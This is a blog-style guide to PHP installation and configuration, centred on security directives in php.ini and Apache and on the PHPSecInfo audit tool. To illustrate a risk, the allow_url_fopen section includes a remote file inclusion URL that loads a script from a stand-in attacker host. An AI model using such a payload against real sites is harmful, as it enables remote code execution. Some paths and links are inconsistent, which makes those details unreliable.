---
weight: 999
url: "/PHP_\\:_Installation_et_configuration/"
title: "PHP: Installation and Configuration"
description: "A guide to PHP installation and configuration, focusing on security settings and best practices for both development and production environments."
categories: ["Development", "Linux", "Servers"]
date: "2009-12-11T20:04:00+02:00"
lastmod: "2009-12-11T20:04:00+02:00"
tags: ["PHP", "Apache", "Security", "Configuration"]
toc: true
---

## Introduction

Even though PHP works well with its initial configuration, it is sometimes essential to modify certain parameters, especially for security reasons. This article shows how to adapt PHP configuration to your applications' environment.

It's not very difficult to install PHP on a server and get an operational system. Generally, we are content with just that: installing PHP. But is that enough? Have you never needed to install an extension, modify the maximum size of memory allocated to PHP? Moreover, a critical part of securing your applications is done at this level. In this article, we'll look in detail at the different configuration options for PHP and how to modify them. Some options must be activated during PHP compilation, others can be modified in Apache, and finally, for most of them, it will be necessary to make changes in the php.ini file(s). To conclude, I will introduce PHPSecInfo, a small utility that analyzes the security options you have chosen to apply to PHP.

## Installation

The first possible configuration takes place during compilation: it allows you to modify certain parameters and add extensions to PHP. I mean "first" in the chronological sense during PHP installation and not in the sense of "main" (see the section on php.ini files in section 3).

To compile PHP, you need to get the PHP sources from http://www.php.net/downloads and decompress them in a directory we'll call php-sources/. Compiling PHP is then very simple and takes place in two steps:

* The configuration phase allowing to select the options to activate and the extensions to install. This is done with the ./configure command (for a list of available options on your system: ./configure -help - for [a complete list](https://www.php.net/manual/fr/configure.php)). Extension installation is done with the --with-extension option where extension is the name of an allowed extension (gd, mysql, pdo, etc.). So to install the gd extension (graphic library), you would do:

```bash
./configure --with-gd
```

* Then, the actual compilation phase which is done with the command:

```bash
make all install
```

Note however that installing available extensions by this method is done much more simply on Debian-based systems using the apt system (apt-cache search php5 to display available libraries). So, still to install the gd library, you would do:

```bash
apt-get install php5-gd
```

Which will spare us the compilation phase...

Other extensions are available through the [PECL](https://pecl.php.net) system, but we would be outside the scope of this article. Let's return now to the parameters that can be modified using the ./configure command. I will only present you with a few in the following table, the complete and detailed list being available in the [PHP manual](https://pear.php.net/manual/fr/standards.php).

![Php1.jpg](/images/php1.avif)

The activation of these options will be done using a command of the type:

```bash
./configure --disable-short-tags
```

followed by:

```bash
make all install
```

Let's now look at another aspect of configuration: Apache.

## Configuration from Apache

It is sometimes interesting to modify PHP behavior only for a few projects hosted in well-defined directories.

If you have compiled PHP as an Apache module (see section1), you can use Apache's configuration file (usually /etc/apache2/apache2.conf file) and .htaccess files (provided that the AllowOverride directive of the directory containing the file has been set to Options or All) to modify PHP configuration.

There are many Apache directives that allow you to modify PHP configuration from Apache configuration files. The complete list of these directives is given in the PHP manual [4]. Note however that a type has been assigned to each directive. This type is used to define modification rights to know from which file you have the right to modify it. There are 4 possible types:

* PHP_INI_SYSTEM: entries can be defined in the php.ini file or the apache2.conf file;
* PHP_INI_PERDIR: entries can be defined in the php.ini file, a .htaccess file or the apache2.conf file;
* PHP_INI_USER: entries can be defined in user scripts;
* PHP_INI_ALL: entries can be defined anywhere.

You will therefore need to be very careful about the type of each [directive](https://www.php.net/manual/fr/ini.php) to know in which file the modification is allowed.

To modify the value of a directive, you will use depending on the case:

1. For directives of type PHP_INI_ALL (including PHP_INI_USER) and PHP_INI_PERDIR:

* php_flag name value

This instruction modifies the value of the directive name by assigning it a value whose type is boolean and is either on or off. For example, for the assert_warning directive (type PHP_INI_ALL) which puts a PHP alert for each failed assertion, the modification is done by:

```
php_flag assert_warning off
```

* php_value name value

This instruction modifies the value of the directive name by assigning it a value. For example, for the include_path directive (type PHP_INI_ALL) which allows you to give a list of directories where the functions require(), include(), fopen(), file(), readfile() and file_get_contents() will look for files, the modification is done by:

```
php_value include_path ".:/usr/lib/php"
```

2. For directives of type PHP_INI_SYSTEM or for directives that the administrator does not want the user to be able to override in a .htaccess file:

* php_admin_flag name value

This instruction behaves in the same way as the php_flag instruction seen previously. It can only be used in the apache2.conf file by the administrator.

* php_admin_value name value

Again, this instruction behaves like php_value and can only be used in the apache2.conf file by the administrator.

Note that PHP constants are of course not accessible in the Apache configuration file. Thus, to modify the error_reporting directive, you will not be able to use constants of the E_STRICT family, but the value associated with them.

To end this part of configuration from Apache, I propose a small example: we have a small site hosted on /var/www/site. The administrator wishes to set the name of the temporary directory used to store files during upload (upload_tmp_dir directive), then a site user wishes to be able to upload larger files than normal in his administration part (user/ directory).

For the administrator, the modification will be on the apache2.conf file:

```apache
<Directory /web/site1/online/>
    AllowOverride All
    php_admin_value upload_tmp_dir "/var/www/site/tmp"
</Directory>
```

For the user, the modification will be in /var/www/site/user/.htaccess:

```ini
php_value upload_max_filesize 2M
```

Let's now look at the most classic configuration case, that of php.ini files.

## Configuration in php.ini Files

Speaking of "the" php.ini file is an abuse of language: there are not one, but several php.ini configuration files. Indeed, when you install PHP as a server, you will need to modify the configuration file associated with Apache: /etc/php5/apache2/php.ini (on a Debian-based distribution). However, PHP can also be used from the command line; this is called PHP-CLI (for Command Line Interface). This specific mode, used among others by PEAR and PECL, has its own configuration file: /etc/php5/cli/php.ini. So be very careful, because although identical at the beginning, any configuration change on one of the systems will not affect the second! Moreover, if any modification to the php.ini file linked to PHP-CLI is effective immediately, to activate the modifications applied to the php.ini file linked to Apache, you will need to remember to restart the server (/etc/init.d/apache2 restart).

With this clarification made, I propose to analyze the structure of a php.ini file and dissect some security-related directives to know what they are used for and what their possible and possibly desirable values are depending on the context.

### Structure of the php.ini File

The php.ini file is a text file divided into several sections. Each section is identified by a name and contains variables related to that section. Each section has the following structure:

```ini
[SectionName]
variable  ="value"
...
variable_n="value_n"
```

The section name is indicated in brackets, followed by a certain number of variable declarations - also called directives - in the form of pairs consisting of the variable name (case-sensitive) and the value associated with it (numeric, boolean, or character string). Note that each variable declaration is done on a new line.

Finally, the character ";" signals a comment. Thus, it is easy to disable a PHP feature by commenting out the line associated with it (and conversely to reactivate it by uncommenting it).

Let's now see what functionalities we can modify.

### The Directives of the php.ini File

We will address here the directives related to PHP security (for a complete list of directives, always refer to the PHP manual). When considering PHP security, it must be kept in mind that there are essentially two contexts in which a server can be used: development and production. Thus, it is, for example, recommended to disable error display on a production server... but it is much more practical to keep this display in development! Here is a (non-restrictive) list of directives to which attention should be paid.

### Managing Server Headers

* expose_php:

This directive tells PHP to add its version number to the standard web server header. It is recommended to disable this directive in production (Off value): the information given can serve potential hackers if you don't regularly update your server.

### Error Management

* display_errors:

This directive allows the display of PHP errors: in production, it must be set to Off (under penalty of providing valuable information to a potential hacker such as the name of your tables, etc.) and, of course, in development, it will need to be set to On.

* error_reporting:

Indicates the types of errors that PHP should report. When choosing to display them, it is recommended to display as many error messages as possible. The recommended values for PHP5 are E_ALL | E_STRICT and E_ALL for PHP4.

* log_errors:

Tells PHP to keep a list of errors encountered in a log file. It is useful to enable this directive even in production for error tracking without direct display.

* error_log:

If the log_errors directive has been set to On, the error_log directive allows you to specify the name and path of the log file you wish to use. Otherwise, the default file will be your Apache's error.log file (/var/log/apache2/error.inc on Debian-based distributions).

* html_errors:

Enables or disables HTML tags in error messages: if you have chosen not to display errors (display_errors to Off), this directive is useless. However, in development, by filling in the docref_root and docref_ext directives, you can have direct links to the documentation of the function that caused the error.

* docref_root:

This directive defines the path to the PHP manual. Generally, it will be:

```
docref_root = http://fr.php.net/manual/fr/
```

* docref_ext:

Defines the extension of the manual files. Again, these will generally be HTML files: docref_ext = .html.

### Managing File Access

* allow_url_fopen:

This directive allows the execution of remote files passed as a parameter of a URL. It is recommended to disable it (Off value): a hacker could have external code executed. If you have an index.php page that expects a load parameter, a hacker could execute:

```
index.php?load=http://www.the-hacker.com/script_pirate.txt
```

* open_basedir:

This directive limits the files accessible by PHP in the tree. The parameter passed to open_basedir is considered as a prefix: if you specify open_basedir = /include/mon_rep, you will give access to /include/mon_rep, /include/mon_repertoire,... To determine a specific directory, you will have to end the path name with a "/".

### Managing Accessible Functions and Classes

* disable_functions and disable_classes:

These directives allow you to prohibit respectively a list of functions and a list of "dangerous" classes. To prohibit, for example, the use of the phpinfo() and system() functions, you will need to specify: disable_functions = phpinfo, system.

### Managing Memory and Time Limits

* memory_limit:

This directive determines the limit memory, in bytes, that a script is allowed to allocate. Since PHP 5.2.0, the default value is set to 16M. This is a reasonable value (an 8M value was previously recommended).

* post_max_size:

Defines the maximum size of data (in bytes) received by the POST method (the memory_limit directive must have a value higher than this one, otherwise post_max_size will be limited to the value of memory_limit). The default value is 8M. It is unlikely that you need more memory (you can even possibly lower this value a bit). However, when uploading files, the data transits via a POST method: make sure then that this value is higher than that of the upload_max_filesize directive.

* max_execution_time:

Maximum execution time of scripts in seconds. By default, the value is 30s, but don't forget that it's rare for a user to wait that long... This directive mainly allows to get out of infinite loops in the development phase. A good compromise seems to be 15s.

### Modifying Directives from PHP

It is also possible to modify php.ini file directives punctually directly in PHP scripts. The ini_set() function is then used [5]. This function takes two parameters: the name of the directive to modify and the new value to assign to it. For example, to disable error display:

```
ini_set('display_errors', 'Off');
```

## Security Audit with PHPSecInfo

To check the most classic security points, there is a tool, PHPSecInfo [6], which will examine the values you have assigned to the various directives in the php.ini file. It is of course only a check of the most common points, but, after decompressing the file you will find on http://phpsec.org/projects/phpsecinfo/phpsecinfo.zip, you will get a report similar to that of figure 1 indicating the weak points of your configuration for each directive. The results are expressed according to a color code:

* green: all is well;
* yellow: possible bad configuration value;
* red: bad configuration value (change of value recommended).

![Php2.jpg](/images/php2.avif)

If you need more information about a warning message, a link pointing to the site http://phpsec.org/ is available for each directive (see Figure 2).

![Php3.jpg](/images/php3.avif)

## Conclusion

In this article, we have seen the different ways to configure PHP. As this language relies on a web server, it is essential to ensure that security-related directives are correctly parameterized to minimize the risk of intrusion into your programs. The PHPSecInfo application can help you in this approach. But above all, don't hesitate to "dig" into the PHP documentation... it's an inexhaustible mine of information.
